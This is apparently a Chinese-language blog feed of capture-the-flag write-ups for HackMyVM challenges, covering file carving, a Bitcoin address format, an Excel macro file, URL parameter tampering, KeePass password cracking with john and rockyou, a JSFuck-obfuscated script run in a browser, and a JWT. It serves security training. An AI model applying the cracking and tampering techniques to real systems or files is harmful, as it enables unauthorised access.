-rwxr-xr-x 1 kali kali  83848 Jun 17 00:44 0.zip
-rwxr-xr-x 1 kali kali 480300 Jun 17 00:44 1371C
-rwxr-xr-x 1 kali kali   4204 Jun 17 00:44 1371C.zlib
-rwxr-xr-x 1 kali kali  79263 Dec 15  2023 image.png
                                      
```

那拿foremost试一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ foremost 045.zip       
Processing: 045.zip
���2��HȠm�I��R��u���2k��,��h�2���6m�}:�g�10d����^ܰьo��M�������׶���y�s�y����so�{M�{��(IHH�(��&amp;!!����7�O�R|��;�A���i������D��k�Of�M���
              +)���d���n�+����W�����
*|
           
```

???

重新下一遍

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ foremost 045.zip
ERROR: /mnt/hgfs/gx/output is not empty
        Please specify another directory or run with -T.
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ rm -rf /mnt/hgfs/gx/output
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ foremost 045.zip          
Processing: 045.zip
���2��HȠm�I��R��u���2k��,��h�2���6m�}:�g�10d����^ܰьo��M�������׶���y�s�y����so�{M�{��(IHH�(��&amp;!!����7�O�R|��;�A���i������D��k�Of�M���
              +)���d���n�+����W�����
*|
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cd output 
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx/output]
└─$ ls -al
total 21
drwxr-xr-x 1 kali kali  4096 Jun 17 00:47 .
drwxr-xr-x 1 kali kali 16384 Jun 17 00:47 ..
-rwxr-xr-x 1 kali kali   719 Jun 17 00:47 audit.txt
drwxr-xr-x 1 kali kali     0 Jun 17 00:47 png
drwxr-xr-x 1 kali kali     0 Jun 17 00:47 zip
                                   
```

ok，是我显示的问题

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/output]
└─$ cd png       
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx/output/png]
└─$ ls -al
total 9
drwxr-xr-x 1 kali kali    0 Jun 17 00:47 .
drwxr-xr-x 1 kali kali 4096 Jun 17 00:47 ..
-rwxr-xr-x 1 kali kali 4618 Jun 17 00:47 00000154.png
                                   
```

![00000154](https://7r1umphk.github.io/image/20250617125120923.webp)

```
HMV{undercover}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20045.html</guid><pubDate>Fri, 27 Jun 2025 09:30:35 +0000</pubDate></item><item><title>Challenge 044</title><link>https://7r1UMPHK.github.io/post/Challenge%20044.html</link><description>![image-20250617121752851](https://7r1umphk.github.io/image/20250617121753191.webp)

```
What type of format corresponds to the following address: bc1qspg3vsx3pphrf[...] Flag: HMV{format}

以下地址对应的格式类型为：bc1qspg3vsx3pphrf[...] 标志：HMV{format}
```

bc1一种加密货币（**Bitcoin**）的前缀格式

然后这种地址是使用Bech32 编码方案

```
HMV{Bech32}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20044.html</guid><pubDate>Fri, 27 Jun 2025 09:30:33 +0000</pubDate></item><item><title>Challenge 043</title><link>https://7r1UMPHK.github.io/post/Challenge%20043.html</link><description>![image-20250617121018302](https://7r1umphk.github.io/image/20250617121018691.webp)

从此 MS Excel 文件中捕获标志。

那下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 043.zip 
-rwxr-xr-x 1 kali kali 14095 Jun 17 00:10 043.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 043.zip 
Archive:  043.zip
  inflating: Challenge.xlsm          
                   
```

![image-20250617121204452](https://7r1umphk.github.io/image/20250617121204745.webp)

有宏，看一下

哈，看不了内容，那去kali执行一下吧（宏可以弹shell所以小心一点）

然后没执行，我扒拉出来了，哈哈哈

![image-20250617121717005](https://7r1umphk.github.io/image/20250617121717432.webp)

```
HMV{b63ce4efbf0b4214a470a707d34bc3ba}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20043.html</guid><pubDate>Fri, 27 Jun 2025 09:30:30 +0000</pubDate></item><item><title>Challenge 042</title><link>https://7r1UMPHK.github.io/post/Challenge%20042.html</link><description>![image-20250617113152195](https://7r1umphk.github.io/image/20250617113152556.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -i http://momo.hackmyvm.eu/n1lsfr4hm/
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 17 Jun 2025 04:02:26 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive


&lt;a href='/index.php?user=1'&gt;John&lt;/a&gt;
&lt;a href='/index.php?user=2'&gt;Monroe&lt;/a&gt;
&lt;a href='/index.php?user=3'&gt;Vault&lt;/a&gt;
&lt;a href='/index.php?user=4'&gt;{&lt;/a&gt;
&lt;a href='/index.php?user=6'&gt;Wesley&lt;/a&gt;
&lt;a href='/index.php?user=7'&gt;Teresa&lt;/a&gt;
&lt;a href='/index.php?user=8'&gt;Fredric&lt;/a&gt;
&lt;a href='/index.php?user=9'&gt;}&lt;/a&gt;
                            
```

少个5

访问一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -i http://momo.hackmyvm.eu/n1lsfr4hm/index.php?user=5
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 17 Jun 2025 04:03:26 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive


&lt;a href='/index.php?user=1'&gt;John&lt;/a&gt;
&lt;a href='/index.php?user=2'&gt;Monroe&lt;/a&gt;
&lt;a href='/index.php?user=3'&gt;Vault&lt;/a&gt;
&lt;a href='/index.php?user=4'&gt;{&lt;/a&gt;
&lt;a href='/index.php?user=6'&gt;Wesley&lt;/a&gt;
&lt;a href='/index.php?user=7'&gt;Teresa&lt;/a&gt;
&lt;a href='/index.php?user=8'&gt;Fredric&lt;/a&gt;
&lt;a href='/index.php?user=9'&gt;}&lt;/a&gt;
&lt;br&gt;&lt;br&gt;&lt;br&gt;o_O                                                                                  
```

没提示，然后就试呗

10没东西

11-20告诉我们没有办法

0没有东西

-1显示了flag

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -i http://momo.hackmyvm.eu/n1lsfr4hm/index.php?user=-1
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 17 Jun 2025 04:08:37 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive


&lt;a href='/index.php?user=1'&gt;John&lt;/a&gt;
&lt;a href='/index.php?user=2'&gt;Monroe&lt;/a&gt;
&lt;a href='/index.php?user=3'&gt;Vault&lt;/a&gt;
&lt;a href='/index.php?user=4'&gt;{&lt;/a&gt;
&lt;a href='/index.php?user=6'&gt;Wesley&lt;/a&gt;
&lt;a href='/index.php?user=7'&gt;Teresa&lt;/a&gt;
&lt;a href='/index.php?user=8'&gt;Fredric&lt;/a&gt;
&lt;a href='/index.php?user=9'&gt;}&lt;/a&gt;
&lt;br&gt;&lt;br&gt;&lt;br&gt;HMV{fcknumbers}                                                                                                                                                                                   
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20042.html</guid><pubDate>Fri, 27 Jun 2025 09:30:27 +0000</pubDate></item><item><title>Challenge 041</title><link>https://7r1UMPHK.github.io/post/Challenge%20041.html</link><description>![image-20250617112622882](https://7r1umphk.github.io/image/20250617112623238.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 041.zip 
-rwxr-xr-x 1 kali kali 1824 Jun 16 23:26 041.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 041.zip 
Archive:  041.zip
 extracting: Challenge.kdbx          
               
```

**KeePass** 数据库文件

应该是破解密码

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ keepass2john Challenge.kdbx &gt; hash    
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 2542373 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
amigos           (Challenge)     
1g 0:00:00:51 DONE (2025-06-16 23:29) 0.01944g/s 9.953p/s 9.953c/s 9.953C/s teiubesc..letmein
Use the '--show' option to display all of the cracked passwords reliably
Session completed. 
                      
```

按个KeePass客户端

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo apt install keepassxc
```

![image-20250617113119656](https://7r1umphk.github.io/image/20250617113120073.webp)

```
HMV{EasyPeasyMoney}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20041.html</guid><pubDate>Fri, 27 Jun 2025 09:30:24 +0000</pubDate></item><item><title>Challenge 040</title><link>https://7r1UMPHK.github.io/post/Challenge%20040.html</link><description>![image-20250617112222809](https://7r1umphk.github.io/image/20250617112223147.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 040.zip 
-rwxr-xr-x 1 kali kali 528 Jun 16 23:22 040.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 040.zip 
Archive:  040.zip
  inflating: 040.txt                 
                  
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat -A 040.txt      
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])())                                                                                                             
```

这是一种叫**JSFuck** 的JavaScript 编程风格，拿去浏览器控制台执行一下就ok了

打开网页about:blank

![image-20250617112545976](https://7r1umphk.github.io/image/20250617112546424.webp)

```
HMV{jslovesxss}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20040.html</guid><pubDate>Fri, 27 Jun 2025 09:30:22 +0000</pubDate></item><item><title>Challenge 039</title><link>https://7r1UMPHK.github.io/post/Challenge%20039.html</link><description>![image-20250617111915057](https://7r1umphk.github.io/image/20250617111922673.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 039.zip 
Archive:  039.zip
  inflating: Challenge.txt           
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat Challenge.txt 
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzUxMiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImZsYWciOiJEb05vdFN0b3JlU2Vuc2l0aXZlRGF0YUhlcmUiLCJpYXQiOjE2OTQ0MTk4ODMsImV4cCI6MTY5NDQyMzQ4M30.GZ29CTL0ggEb7ZNvZU7HjeXKWUdco8uLvEbHdpW0DODJQ74IvOPJsoxhL1o5aOq_GLEoOH4vU9fa9kn67zbJcQyr8kjAojX_oVUHyjH4q0UHVASPGgtZMAASUz84TAiX3AWnKFDsgPKumEas01R1CdOv3HVwfU5az5m45D8TPyBB7JxXQdLZyDIIbq4G8fGVUtj3F9oi96d2AzZrpYb8aGyOMsLeDA2wFXSkLQo--6BsY6zOAgsPNVkjrK5jWVXYuvS4U2SnsIp3Gq6vS6rPv4B4qvcBE5-RJ__ZcPg-eZJF-OJzQ9DlKpRE0wg3dzRJWcqTlp6q1Nbk9VQnHc_lUg                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat -A Challenge.txt 
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzUxMiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImZsYWciOiJEb05vdFN0b3JlU2Vuc2l0aXZlRGF0YUhlcmUiLCJpYXQiOjE2OTQ0MTk4ODMsImV4cCI6MTY5NDQyMzQ4M30.GZ29CTL0ggEb7ZNvZU7HjeXKWUdco8uLvEbHdpW0DODJQ74IvOPJsoxhL1o5aOq_GLEoOH4vU9fa9kn67zbJcQyr8kjAojX_oVUHyjH4q0UHVASPGgtZMAASUz84TAiX3AWnKFDsgPKumEas01R1CdOv3HVwfU5az5m45D8TPyBB7JxXQdLZyDIIbq4G8fGVUtj3F9oi96d2AzZrpYb8aGyOMsLeDA2wFXSkLQo--6BsY6zOAgsPNVkjrK5jWVXYuvS4U2SnsIp3Gq6vS6rPv4B4qvcBE5-RJ__ZcPg-eZJF-OJzQ9DlKpRE0wg3dzRJWcqTlp6q1Nbk9VQnHc_lUg                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ xxd Challenge.txt 
00000000: 6579 4a30 6558 4169 4f69 4a4b 5631 5169  eyJ0eXAiOiJKV1Qi
00000010: 4c43 4a68 6247 6369 4f69 4a53 557a 5578  LCJhbGciOiJSUzUx
00000020: 4d69 4a39 2e65 794a 7a64 5749 694f 6949  MiJ9.eyJzdWIiOiI
00000030: 784d 6a4d 304e 5459 334f 446b 7749 6977  xMjM0NTY3ODkwIiw
00000040: 6962 6d46 745a 5349 3649 6b70 7661 4734  ibmFtZSI6IkpvaG4
00000050: 6752 4739 6c49 6977 6959 5752 7461 5734  gRG9lIiwiYWRtaW4
00000060: 694f 6e52 7964 5755 7349 6d5a 7359 5763  iOnRydWUsImZsYWc
00000070: 694f 694a 4562 3035 7664 464e 3062 334a  iOiJEb05vdFN0b3J
00000080: 6c55 3256 7563 326c 3061 585a 6c52 4746  lU2Vuc2l0aXZlRGF
00000090: 3059 5568 6c63 6d55 694c 434a 7059 5851  0YUhlcmUiLCJpYXQ
000000a0: 694f 6a45 324f 5451 304d 546b 344f 444d  iOjE2OTQ0MTk4ODM
000000b0: 7349 6d56 3463 4349 364d 5459 354e 4451  sImV4cCI6MTY5NDQ
000000c0: 794d 7a51 344d 3330 2e47 5a32 3943 544c  yMzQ4M30.GZ29CTL
000000d0: 3067 6745 6237 5a4e 765a 5537 486a 6558  0ggEb7ZNvZU7HjeX
000000e0: 4b57 5564 636f 3875 4c76 4562 4864 7057  KWUdco8uLvEbHdpW
000000f0: 3044 4f44 4a51 3734 4976 4f50 4a73 6f78  0DODJQ74IvOPJsox
00000100: 684c 316f 3561 4f71 5f47 4c45 6f4f 4834  hL1o5aOq_GLEoOH4
00000110: 7655 3966 6139 6b6e 3637 7a62 4a63 5179  vU9fa9kn67zbJcQy
00000120: 7238 6b6a 416f 6a58 5f6f 5655 4879 6a48  r8kjAojX_oVUHyjH
00000130: 3471 3055 4856 4153 5047 6774 5a4d 4141  4q0UHVASPGgtZMAA
00000140: 5355 7a38 3454 4169 5833 4157 6e4b 4644  SUz84TAiX3AWnKFD
00000150: 7367 504b 756d 4561 7330 3152 3143 644f  sgPKumEas01R1CdO
